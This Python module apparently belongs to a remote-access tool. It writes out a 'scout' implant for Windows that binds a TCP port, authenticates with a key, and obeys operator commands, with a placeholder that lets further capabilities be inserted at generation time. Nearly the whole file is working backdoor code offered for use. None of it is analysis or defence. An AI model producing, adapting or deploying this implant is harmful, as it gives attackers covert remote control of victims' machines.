import library.modules.config as config
import library.modules.safe_open as safe_open

config.main()


def main(option):
    if option == 'generate':
        host = config.scout_values['Host'][0]
        port = config.scout_values['Port'][0]
        key = config.key
        timeout = config.scout_values['Timeout'][0]
        filepath = config.scout_values['Path'][0]
        config.import_statements.append('import socket')
        config.import_statements.append('from os import _exit')
        config.import_statements.append('from time import sleep')
        with safe_open.main(filepath, 'w') as f:
            if ',' in host:
                host = str(host.replace(' ', '').split(','))
                f.write('''
def recv_all(sock):
    sock.settimeout(None)
    data = sock.recv(999999).decode()
    sock.settimeout(2)
    while True:
        try:
            tmp_data = sock.recv(999999).decode()
            if not tmp_data:
                raise socket.error
            data += tmp_data
        except (socket.error, socket.timeout):
            return data
host_list = variable_host
while True:
    connected = False
    while True:
        for i in host_list:
            try:
                sock = socket.socket()
                sock.settimeout(variable_timeout)
                sock.bind((i,variable_port))
                sock.listen(1)
                s, a = sock.accept()
                s.sendall('variable_key'.encode())
                connected = True
                break
            except (socket.timeout,socket.error):
                continue
        if connected:
            break
    while True:
        try:
            data = recv_all(s)
            command = data.split(' ',1)[0]
            if command == 'kill':
                s.sendall('[*]Scout is killing itself...'.encode())
                _exit(1)
            elif command in ('help','?'):
                s.sendall(help_menu.encode())
            elif command == 'ping':
                s.sendall('[+]Scout is alive'.encode())
            elif command == 'sleep':
                length = int(data.split(' ',1)[1])
                s.sendall('[*]Scout is sleeping...'.encode())
                for i in range(length):
                    sleep(1)
                break
            elif command == 'disconnect':
                s.sendall('[*]Scout is disconnecting itself...'.encode())
                sleep(3)
                break#Statements#
            else:
                s.sendall('[-]Scout does not have the capability to run this command. (Was it loaded during generation?)'.encode())
        except (socket.error,socket.timeout) as e:
            try:
                if type(e) not in (socket.error,socket.timeout):
                    raise e
                s.close()
                break
            except IndexError:
                s.sendall('[-]Please supply valid arguments for the command you are running'.encode())
            except Exception as e:
                s.sendall(('[!]Error in scout : ' + str(e)).encode())
        except IndexError:
            s.sendall('[-]Please supply valid arguments for the command you are running'.encode())
        except Exception as e:
            s.sendall(('[!]Error in scout : ' + str(e)).encode())
'''.replace('variable_timeout', timeout).replace('variable_host', host).replace('variable_port', port).replace(
                    'variable_key', key))
            else:
                f.write('''
def recv_all(sock):
    sock.settimeout(None)
    data = sock.recv(999999).decode()
    sock.settimeout(2)
    while True:
        try:
            tmp_data = sock.recv(999999).decode()
            if not tmp_data:
                raise socket.error
            data += tmp_data
        except (socket.error, socket.timeout):
            return data
        
while True:
    while True:
        try:
            sock = socket.socket()
            sock.settimeout(variable_timeout)
            sock.bind(('variable_host',variable_port))
            sock.listen(1)
            s, a = sock.accept()
            s.sendall('variable_key'.encode())
            break
        except (socket.timeout,socket.error):
            continue
    while True:
        try:
            data = recv_all(s)
            command = data.split(' ',1)[0]
            if command == 'kill':
                s.sendall('[*]Scout is killing itself...'.encode())
                _exit(1)
            elif command in ('help','?'):
                s.sendall(help_menu.encode())
            elif command == 'ping':
                s.sendall('[+]Scout is alive'.encode())
            elif command == 'sleep':
                length = int(data.split(' ',1)[1])
                s.sendall('[*]Scout is sleeping...'.encode())
                for i in range(length):
                    sleep(1)
                break
            elif command == 'disconnect':
                s.sendall('[*]Scout is disconnecting itself...'.encode())
                sleep(3)
                break#Statements#
            else:
                s.sendall('[-]Scout does not have the capability to run this command. (Was it loaded during generation?)'.encode())
        except (socket.error,socket.timeout) as e:
            try:
                if type(e) not in (ConnectionResetError,socket.timeout):
                    raise e
                s.close()
                break
            except IndexError:
                s.sendall('[-]Please supply valid arguments for the command you are running'.encode())
            except Exception as e:
                s.sendall(('[!]Error in scout : ' + str(e)).encode())
        except IndexError:
            s.sendall('[-]Please supply valid arguments for the command you are running'.encode())
        except Exception as e:
            s.sendall(('[!]Error in scout : ' + str(e)).encode())
'''.replace('variable_timeout', timeout).replace('variable_host', host).replace('variable_port', port).replace(
                    'variable_key', key))
    elif option == 'info':
        print('\nName             : Bind TCP Base component' \
              '\nOS               : Windows' \
              '\nRequired Modules : socket, time' \
              '\nCommands         : kill, ping, sleep <time>, disconnect' \
              '\nDescription      : The base component of the scout, it hosts a server and allows the user to connect to it. It also supports connection status commands' \
              '\nConnection type  : Bind\n')
